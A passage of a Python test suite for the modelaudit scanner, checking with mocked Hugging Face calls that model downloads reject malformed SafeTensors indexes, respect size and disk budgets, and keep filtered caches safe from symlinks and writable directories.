            (download_path / index_name).write_bytes(index_payload)
            (download_path / shard_name).write_bytes(shard_payload)
            return str(download_path)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"}),
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                side_effect=lambda _repo, filename, _revision, _budget: (
                    "safetensors" if filename.endswith(".safetensors") else None
                ),
            ),
            patch("requests.get", return_value=_FakeRangeResponse(index_payload)),
            patch("huggingface_hub.snapshot_download", side_effect=snapshot_side_effect),
        ):
            download_path = download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
            )

        result = scan_model_directory_or_file(
            str(download_path),
            cache_enabled=False,
            scanners=["safetensors"],
        )

        assert result.success is True
        assert determine_exit_code(result) == 0
        assert "safetensors" in result.scanner_names
        assert set(result.scanner_names) <= {"safetensors", "scanner_selection"}

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "model.safetensors.index.json",
                "model-00000-of-00002.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_rejects_incomplete_zero_based_safetensors_index_family(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """An indexed shard missing from the immutable repo listing must fail closed."""
        mock_requests_get.return_value = _FakeRangeResponse(
            json.dumps(
                {
                    "weight_map": {
                        "a": "model-00000-of-00002.safetensors",
                        "b": "model-00001-of-00002.safetensors",
                    }
                }
            ).encode()
        )

        with pytest.raises(Exception, match="references missing model shard"):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "model.safetensors.index.json",
                "shards/model-00001-of-00002.safetensors",
                "shards/model-00002-of-00002.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_rejects_parent_index_missing_nested_target_with_substitute(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """A root index must govern nested selected shards before snapshot download."""
        mock_requests_get.return_value = _FakeRangeResponse(
            json.dumps(
                {
                    "weight_map": {
                        "a": "shards/model-00000-of-00002.safetensors",
                        "b": "shards/model-00001-of-00002.safetensors",
                    }
                }
            ).encode()
        )

        with pytest.raises(Exception, match="references missing model shard"):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @pytest.mark.parametrize(
        ("foreign_target", "model_extensions"),
        [
            ("pytorch_model-00001-of-00001.bin", {".bin", ".safetensors"}),
            ("checkpoint_1.pt", {".pt", ".safetensors"}),
            ("model_weights_1.h5", {".h5", ".safetensors"}),
            ("params_shard_1.bin", {".bin", ".safetensors"}),
            ("pytorch_model-00001-of-00001.bin", {".safetensors"}),
        ],
        ids=[
            "default-pytorch-bin",
            "default-checkpoint-pt",
            "default-keras-h5",
            "default-custom-bin",
            "explicit-safetensors-only",
        ],
    )
    def test_download_model_rejects_foreign_safetensors_index_targets_before_snapshot(
        self,
        foreign_target: str,
        model_extensions: set[str],
    ) -> None:
        """A SafeTensors index must not authorize foreign shard formats for download."""
        repo_files = [
            "model.safetensors.index.json",
            "model-00000-of-00001.safetensors",
            foreign_target,
        ]
        index_payload = json.dumps({"weight_map": {"tensor": foreign_target}}).encode()

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value=model_extensions),
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                side_effect=lambda _repo, filename, _revision, _budget: (
                    "safetensors" if filename.endswith(".safetensors") else None
                ),
            ),
            patch("requests.get", return_value=_FakeRangeResponse(index_payload)),
            patch("huggingface_hub.snapshot_download") as mock_snapshot_download,
            pytest.raises(Exception, match="references a non-SafeTensors shard target"),
        ):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "model.safetensors.index.json",
                "model-00000-of-00001.safetensors",
                "model-00001-of-00001.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_rejects_unreferenced_safetensors_index_siblings(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """A valid index plus an extra same-family sibling must fail closed before download."""
        mock_requests_get.return_value = _FakeRangeResponse(
            json.dumps({"weight_map": {"tensor": "model-00000-of-00001.safetensors"}}).encode()
        )

        with pytest.raises(Exception, match="leaves unreferenced model shard"):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            ["model.safetensors.index.json", "model-00000-of-00001.safetensors"],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_counts_index_materialized_files(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """SafeTensors index expansion must not bypass the selected-file size budget."""
        mock_requests_get.return_value = _FakeRangeResponse(
            json.dumps({"weight_map": {"tensor": "model-00000-of-00001.safetensors"}}).encode()
        )
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="model.safetensors.index.json", size=60),
            SimpleNamespace(path="model-00000-of-00001.safetensors", size=50),
        ]

        with pytest.raises(Exception, match="selected Hugging Face files total 110 bytes exceeds max size 100 bytes"):
            download_model("https://huggingface.co/test/model", max_size=100)

        mock_snapshot_download.assert_not_called()

    """Test model downloading functionality."""

    @patch("modelaudit.utils.sources.huggingface._get_model_size_with_deadline", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            ["model.onnx", "model.safetensors.index.json", "model-00000-of-00001.safetensors"],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_non_safetensors_selection_ignores_unrelated_index(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """An ONNX-only download must content-prove a SafeTensors-named data file before excluding it."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.onnx").write_bytes(_MINIMAL_ONNX_MODEL_PROTO)
        mock_snapshot_download.return_value = str(download_path)
        safetensors_header = b'{"__metadata__":{"format":"pt"}}'
        mock_requests_get.return_value = _FakeRangeResponse(
            struct.pack("<Q", len(safetensors_header)) + safetensors_header
        )

        result = download_model(
            "https://huggingface.co/test/model",
            cache_dir=tmp_path / "cache",
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
        )

        assert result == download_path
        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.onnx"]
        mock_requests_get.assert_called_once()
        assert "model-00000-of-00001.safetensors" in mock_requests_get.call_args.args[0]

    @pytest.mark.parametrize(
        ("extensions", "detected_format", "expected_files"),
        [
            ({".onnx"}, "pickle", ["model.onnx"]),
            ({".pkl"}, "pickle", ["known.pkl", "hidden.safetensors"]),
            ({".onnx"}, "onnx", ["model.onnx", "hidden.safetensors"]),
        ],
        ids=["reject-foreign-route", "include-pickle-disguise", "include-onnx-disguise"],
    )
    def test_standard_plan_extension_only_routes_shard_named_content(
        self,
        extensions: set[str],
        detected_format: str,
        expected_files: list[str],
    ) -> None:
        """Extension-only callers must filter on bounded content, not the shard-looking suffix."""
        repo_files = [expected_files[0], "hidden.safetensors"]
        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                return_value=detected_format,
            ) as mock_detect,
        ):
            plan = plan_huggingface_model_download(
                "https://huggingface.co/test/model",
                scannable_extensions=extensions,
            )

        assert plan.selected_files == expected_files
        mock_detect.assert_called_once_with("test/model", "hidden.safetensors", _HF_TEST_REVISION, ANY)

    @pytest.mark.parametrize("scanner_id", ["metadata", "text"])
    def test_standard_plan_non_content_scanners_do_not_probe_unrelated_files(self, scanner_id: str) -> None:
        """Metadata/text-only policy must not spend remote probe budget on files it cannot claim."""
        repo_files = ["README.md", *(f"metadata-{index}.json" for index in range(300))]
        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format") as mock_detect,
        ):
            plan = plan_huggingface_model_download(
                "https://huggingface.co/test/model",
                scannable_extensions={".md"},
                scannable_scanner_ids={scanner_id},
                allow_content_probes=False,
            )

        assert plan.selected_files == ["README.md"]
        mock_detect.assert_not_called()

    def test_download_model_filtered_cache_isolates_stale_unselected_files(self, tmp_path: Path) -> None:
        """A filtered persistent snapshot must not expose files from an earlier broader download."""
        tmp_path.chmod(0o700)
        cache_dir = tmp_path / "cache"
        broad_download_path = cache_dir / "huggingface" / "test" / "model"
        broad_download_path.mkdir(parents=True)
        cache_dir.chmod(0o755)
        (cache_dir / "huggingface").chmod(0o755)
        stale = broad_download_path / "stale.safetensors"
        stale.write_bytes(b"stale")

        def snapshot_side_effect(*, local_dir: str, **_kwargs: object) -> str:
            local_path = Path(local_dir)
            assert local_path != broad_download_path
            assert not (local_path / stale.name).exists()
            (local_path / "model.onnx").write_bytes(_MINIMAL_ONNX_MODEL_PROTO)
            return str(local_path)

        def disk_space_side_effect(path: Path, required_size: int) -> tuple[bool, str]:
            assert path != broad_download_path
            assert required_size == len(_MINIMAL_ONNX_MODEL_PROTO)
            return True, ""

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(["model.onnx"], _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=({"model.onnx": len(_MINIMAL_ONNX_MODEL_PROTO)}, _HF_TEST_REVISION),
            ),
            patch("modelaudit.utils.sources.huggingface.check_disk_space", side_effect=disk_space_side_effect),
            patch("huggingface_hub.snapshot_download", side_effect=snapshot_side_effect),
        ):
            result = download_model(
                "https://huggingface.co/test/model",
                cache_dir=cache_dir,
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        assert result != broad_download_path
        assert stale.exists()
        assert (result / "model.onnx").is_file()
        assert {path.name for path in result.iterdir()} == {"model.onnx"}

    @pytest.mark.skipif(os.name == "nt", reason="POSIX ownership and mode trust policy")
    @pytest.mark.parametrize("ancestor_mode", [0o700, 0o755])
    def test_build_filtered_cache_accepts_owned_nonwritable_hierarchy(
        self,
        tmp_path: Path,
        ancestor_mode: int,
    ) -> None:
        """Owner-controlled cache ancestors remain valid with private or read-only sharing modes."""
        tmp_path.chmod(0o700)
        cache_root = tmp_path / "hf-cache"
        selection_parent = cache_root / ".modelaudit-selections" / "test"
        selection_parent.mkdir(parents=True)
        cache_root.chmod(0o755)
        (cache_root / ".modelaudit-selections").chmod(0o755)
        selection_parent.chmod(ancestor_mode)

        selection_path = _build_huggingface_filtered_download_path(
            cache_root,
            "test",
            "model",
            "test/model",
            _HF_TEST_REVISION,
            ["model.onnx"],
            {".onnx"},
            {"onnx"},
        )

        assert selection_path.is_dir()
        assert selection_path.is_relative_to(cache_root)

    @pytest.mark.skipif(os.name == "nt", reason="POSIX ownership and mode trust policy")
    @pytest.mark.parametrize("ancestor_mode", [0o770, 0o777])
    def test_download_model_filtered_cache_rejects_writable_ancestor_before_pruning(
        self,
        tmp_path: Path,
        ancestor_mode: int,
    ) -> None:
        """A shared-user-replaceable selection hierarchy must fail before local mutation or download."""
        cache_dir = tmp_path / "cache"
        unsafe_parent = cache_dir / "huggingface" / ".modelaudit-selections" / "test"
        unsafe_parent.mkdir(parents=True)
        (cache_dir / "huggingface").chmod(0o755)
        (cache_dir / "huggingface" / ".modelaudit-selections").chmod(0o755)
        unsafe_parent.chmod(ancestor_mode)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(["model.onnx"], _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=({"model.onnx": len(_MINIMAL_ONNX_MODEL_PROTO)}, _HF_TEST_REVISION),
            ),
            patch("modelaudit.utils.sources.huggingface._prune_huggingface_filtered_download_path") as mock_prune,
            patch("huggingface_hub.snapshot_download") as mock_snapshot_download,
            pytest.raises(Exception, match="safe filtered Hugging Face cache path"),
        ):
            download_model(
                "https://huggingface.co/test/model",
                cache_dir=cache_dir,
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        mock_prune.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @pytest.mark.skipif(os.name == "nt", reason="POSIX ownership and mode trust policy")
    @pytest.mark.parametrize(
        ("parent_mode", "foreign_owner"),
        [(0o777, False), (0o1777, True)],
        ids=["non-sticky-writable", "attacker-owned-sticky"],
    )
    def test_build_filtered_cache_rejects_replaceable_cache_root_anchor(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        parent_mode: int,
        foreign_owner: bool,
    ) -> None:
        """A private cache root is unsafe when another user can replace it through its parent."""
        shared_parent = tmp_path / "shared"
        cache_root = shared_parent / "huggingface"
        cache_root.mkdir(parents=True, mode=0o700)
        cache_root.chmod(0o700)
        shared_parent.chmod(parent_mode)
        if foreign_owner:
            from modelaudit.utils.sources import huggingface as huggingface_module

            original_stat = huggingface_module._stat_huggingface_cache_path

            def stat_with_foreign_shared_owner(path: Path) -> os.stat_result:
                result = original_stat(path)
                if path.absolute() != shared_parent:
                    return result
                values = list(result)
                values[4] = os.geteuid() + 1
                return os.stat_result(values)

            monkeypatch.setattr(huggingface_module, "_stat_huggingface_cache_path", stat_with_foreign_shared_owner)

        with pytest.raises(ValueError, match="safe filtered Hugging Face cache path"):
            _build_huggingface_filtered_download_path(
                cache_root,
                "test",
                "model",
                "test/model",
                _HF_TEST_REVISION,
                ["model.onnx"],
                {".onnx"},
                {"onnx"},
            )

    def test_build_filtered_cache_rejects_symlink_component(
        self,
        tmp_path: Path,
        requires_symlinks: None,
    ) -> None:
        """A selection hierarchy cannot traverse a pre-existing symlink or junction-like component."""
        del requires_symlinks
        cache_root = tmp_path / "hf-cache"
        selection_root = cache_root / ".modelaudit-selections"
        selection_root.mkdir(parents=True)
        cache_root.chmod(0o755)
        selection_root.chmod(0o755)
        outside = tmp_path / "outside"
        outside.mkdir()
        (selection_root / "test").symlink_to(outside, target_is_directory=True)

        with pytest.raises(ValueError, match="safe filtered Hugging Face cache path"):
            _build_huggingface_filtered_download_path(
                cache_root,
                "test",
                "model",
                "test/model",
                _HF_TEST_REVISION,
                ["model.onnx"],
                {".onnx"},
                {"onnx"},
            )

    def test_build_filtered_cache_fails_closed_without_platform_ownership_proof(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Destructive deterministic cache reuse is unavailable without an owner/ACL trust proof."""
        from modelaudit.utils.sources import huggingface as huggingface_module

        monkeypatch.setattr(huggingface_module, "_filtered_huggingface_cache_trust_supported", lambda: False)

        with pytest.raises(ValueError, match="cannot be established on Windows; use streaming mode"):
            _build_huggingface_filtered_download_path(
                tmp_path / "hf-cache",
                "test",
                "model",
                "test/model",
                _HF_TEST_REVISION,
                ["model.onnx"],
                {".onnx"},
                {"onnx"},
            )

    def test_download_model_filtered_cache_preserves_symlink_target_on_failure(
        self,
        tmp_path: Path,
        requires_symlinks: None,
    ) -> None:
        """A filtered failure must not delete a pre-existing repository-cache symlink target."""
        del requires_symlinks
        cache_dir = tmp_path / "cache"
        cache_root = cache_dir / "huggingface"
        repository_path = cache_root / "test" / "model"
        repository_path.parent.mkdir(parents=True)
        cache_dir.chmod(0o755)
        cache_root.chmod(0o755)
        legacy_target = tmp_path / "outside-legacy-cache"
        legacy_target.mkdir()
        repository_path.symlink_to(legacy_target, target_is_directory=True)
        sentinel = legacy_target / "other-model.bin"
        sentinel.write_bytes(b"keep")

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(["model.onnx"], _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=({}, _HF_TEST_REVISION),
            ),
            patch("huggingface_hub.snapshot_download", side_effect=RuntimeError("download failed")),
            pytest.raises(Exception, match="download failed"),
        ):
            download_model(
                "https://huggingface.co/test/model",
                cache_dir=cache_dir,
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        assert repository_path.is_symlink()
        assert sentinel.read_bytes() == b"keep"

    def test_download_model_filtered_default_cache_uses_selection_directory(self, tmp_path: Path) -> None:
        """Default-cache filtering must not expose stale files from a broader snapshot."""
        tmp_path.chmod(0o700)
        cache_root = tmp_path / "hf-cache" / "hub"
        stale_snapshot = cache_root / "models--test--model" / "snapshots" / _HF_TEST_REVISION
        stale_snapshot.mkdir(parents=True)
        cache_root.parent.chmod(0o755)
        cache_root.chmod(0o755)
        stale = stale_snapshot / "stale.pkl"
        stale.write_bytes(b"stale")

        def snapshot_side_effect(*, local_dir: str, **_kwargs: object) -> str:
            local_path = Path(local_dir)
            assert local_path != stale_snapshot
            (local_path / "model.onnx").write_bytes(_MINIMAL_ONNX_MODEL_PROTO)
            return str(local_path)

        with (
            patch("modelaudit.utils.sources.huggingface._get_hf_cache_root", return_value=cache_root),
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(["model.onnx"], _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=({"model.onnx": len(_MINIMAL_ONNX_MODEL_PROTO)}, _HF_TEST_REVISION),
            ),
            patch(
                "modelaudit.utils.sources.huggingface.check_disk_space",
                return_value=(True, "sufficient selected space"),
            ) as mock_check_disk_space,
            patch("huggingface_hub.snapshot_download", side_effect=snapshot_side_effect) as mock_snapshot_download,
        ):
            result = download_model(
                "https://huggingface.co/test/model",
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )
            other_policy_result = download_model(
                "https://huggingface.co/test/model",
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"safetensors"},
            )

        assert result.parent == cache_root / ".modelaudit-selections" / "test" / "model"
        assert other_policy_result.parent == result.parent
        assert other_policy_result != result
        assert [item.kwargs["local_dir"] for item in mock_snapshot_download.call_args_list] == [
            str(result),
            str(other_policy_result),
        ]
        assert {path.name for path in result.iterdir()} == {"model.onnx"}
        assert {path.name for path in other_policy_result.iterdir()} == {"model.onnx"}
        assert stale.read_bytes() == b"stale"
        assert [call.args[1] for call in mock_check_disk_space.call_args_list] == [
            len(_MINIMAL_ONNX_MODEL_PROTO),
            len(_MINIMAL_ONNX_MODEL_PROTO),
        ]

    def test_download_model_filtered_prunes_stale_selection_files(self, tmp_path: Path) -> None:
        """A reused filtered directory must remove stale unselected leaves before acquisition."""

        def snapshot_side_effect(*, local_dir: str, **_kwargs: object) -> str:
            local_path = Path(local_dir)
            (local_path / "model.onnx").write_bytes(_MINIMAL_ONNX_MODEL_PROTO)
            return str(local_path)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(["model.onnx"], _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=({"model.onnx": len(_MINIMAL_ONNX_MODEL_PROTO)}, _HF_TEST_REVISION),
            ),
            patch(
                "modelaudit.utils.sources.huggingface.check_disk_space",
                return_value=(True, "sufficient selected space"),
            ) as mock_check_disk_space,
            patch("huggingface_hub.snapshot_download", side_effect=snapshot_side_effect) as mock_snapshot_download,
        ):
            result = download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )
            (result / "stale.pkl").write_bytes(b"stale")
            second_result = download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        assert second_result == result
        assert not (result / "stale.pkl").exists()
        assert all(call.kwargs["force_download"] is True for call in mock_snapshot_download.call_args_list)
        assert [call.args[1] for call in mock_check_disk_space.call_args_list] == [
            len(_MINIMAL_ONNX_MODEL_PROTO),
            len(_MINIMAL_ONNX_MODEL_PROTO),
        ]

    def test_download_model_standard_onnx_discovery_receives_deadline_check(self, tmp_path: Path) -> None:
        """Standard ONNX companion parsing must remain inside the acquisition deadline."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.onnx").write_bytes(_MINIMAL_ONNX_MODEL_PROTO)

        def discover_with_expired_deadline(
            _path: Path,
            _filename: str,
            _repo_files: set[str],
            interrupt_check: Callable[[], None] | None,
        ) -> list[str]:
            assert interrupt_check is not None
            with patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=float("inf")):
                interrupt_check()
            return []

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(["model.onnx"], _HF_TEST_REVISION, None),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._run_huggingface_download_with_deadline",
                return_value=str(download_path),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._discover_hf_onnx_external_data_files",
                side_effect=discover_with_expired_deadline,
            ),
            pytest.raises(Exception, match="acquisition timed out"),
        ):
            download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                timeout_seconds=30,
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

    def test_download_model_filtered_onnx_includes_external_data(self, tmp_path: Path) -> None:
        """A filtered standard ONNX snapshot must materialize declared external-data companions."""
        repo_files = ["model.onnx", "weights/model.onnx_data"]
        snapshot_calls: list[list[str]] = []

        def snapshot_side_effect(*, local_dir: str, allow_patterns: list[str], **_kwargs: object) -> str:
            snapshot_calls.append(allow_patterns)
            local_path = Path(local_dir)
            for filename in allow_patterns:
                path = local_path / filename
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(b"onnx" if filename == "model.onnx" else b"weights")
            return str(local_path)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes", return_value=({}, _HF_TEST_REVISION)
            ),
            patch(
                "modelaudit.utils.sources.huggingface._discover_hf_onnx_external_data_files",
                return_value=["weights/model.onnx_data"],
            ),
            patch("huggingface_hub.snapshot_download", side_effect=snapshot_side_effect),
        ):
            result = download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        assert snapshot_calls == [["model.onnx"], ["model.onnx", "weights/model.onnx_data"]]
        assert (result / "weights" / "model.onnx_data").read_bytes() == b"weights"

    def test_download_model_filtered_content_routed_onnx_includes_external_data(self, tmp_path: Path) -> None:
        """A renamed ONNX model must retain its declared external-data companions."""
        repo_files = ["renamed.bin", "weights/model.onnx_data"]
        snapshot_calls: list[list[str]] = []

        def remote_route_side_effect(_repo_id: str, filename: str, *_args: object, **_kwargs: object) -> str | None:
            return "onnx" if filename == "renamed.bin" else None

        def snapshot_side_effect(*, local_dir: str, allow_patterns: list[str], **_kwargs: object) -> str:
            snapshot_calls.append(allow_patterns)
            local_path = Path(local_dir)
            for filename in allow_patterns:
                path = local_path / filename
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(b"onnx" if filename == "renamed.bin" else b"weights")
            return str(local_path)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                side_effect=remote_route_side_effect,
            ),
            patch(
                "modelaudit.utils.sources.huggingface.detect_file_format_for_skip_filter",
                return_value="onnx",
            ) as mock_detect_local,
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes", return_value=({}, _HF_TEST_REVISION)
            ),
            patch(
                "modelaudit.utils.sources.huggingface._discover_hf_onnx_external_data_files",
                return_value=["weights/model.onnx_data"],
            ),
            patch("huggingface_hub.snapshot_download", side_effect=snapshot_side_effect),
        ):
            result = download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        assert snapshot_calls == [["renamed.bin"], ["renamed.bin", "weights/model.onnx_data"]]
        mock_detect_local.assert_called_once_with(str(result / "renamed.bin"))
        assert (result / "weights" / "model.onnx_data").read_bytes() == b"weights"

    def test_download_model_filtered_onnx_preflights_external_data_disk_space(self, tmp_path: Path) -> None:
        """Declared ONNX sidecars must pass disk preflight before the second snapshot."""
        repo_files = ["model.onnx", "weights/model.onnx_data"]

        def size_side_effect(
            _repo_id: str,
            filenames: list[str],
            **_kwargs: object,
        ) -> tuple[dict[str, int], str]:
            sizes = {"model.onnx": 10, "weights/model.onnx_data": 1_000}
            return {filename: sizes[filename] for filename in filenames}, _HF_TEST_REVISION

        def snapshot_side_effect(*, local_dir: str, **_kwargs: object) -> str:
            local_path = Path(local_dir)
            (local_path / "model.onnx").write_bytes(b"onnx")
            return str(local_path)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                side_effect=size_side_effect,
            ),
            patch(
                "modelaudit.utils.sources.huggingface._discover_hf_onnx_external_data_files",
                return_value=["weights/model.onnx_data"],
            ),
            patch(
                "modelaudit.utils.sources.huggingface.check_disk_space",
                side_effect=[(True, "enough for graph"), (False, "sidecar does not fit")],
            ) as mock_check_disk_space,
            patch("huggingface_hub.snapshot_download", side_effect=snapshot_side_effect) as mock_snapshot_download,
            pytest.raises(Exception, match="sidecar does not fit"),
        ):
            download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        assert [call.args[1] for call in mock_check_disk_space.call_args_list] == [10, 1_000]
        mock_snapshot_download.assert_called_once()

    @pytest.mark.parametrize(
        ("filename", "extensions", "scanner_id"),
        [
            ("payload.safetensors", {".pkl", ".pickle"}, "pickle"),
            ("model.safetensors.index.json", {".pkl", ".pickle"}, "pickle"),
            ("payload.safetensors", {".gz"}, "compressed"),
        ],
        ids=["pickle-suffix", "pickle-index-name", "compressed-suffix"],
    )
    def test_download_model_overlap_selection_probes_safetensors_candidates(
        self,
        tmp_path: Path,
        filename: str,
        extensions: set[str],
        scanner_id: str,
    ) -> None:
        """Overlap scanners must content-route payloads hidden behind SafeTensors names."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        mock_snapshot_download = MagicMock(return_value=str(download_path))

        def snapshot_side_effect(**kwargs: object) -> str:
            allow_patterns = cast(list[str], kwargs["allow_patterns"])
            for filename in allow_patterns:
                (download_path / filename).write_bytes(payload)
            return str(download_path)

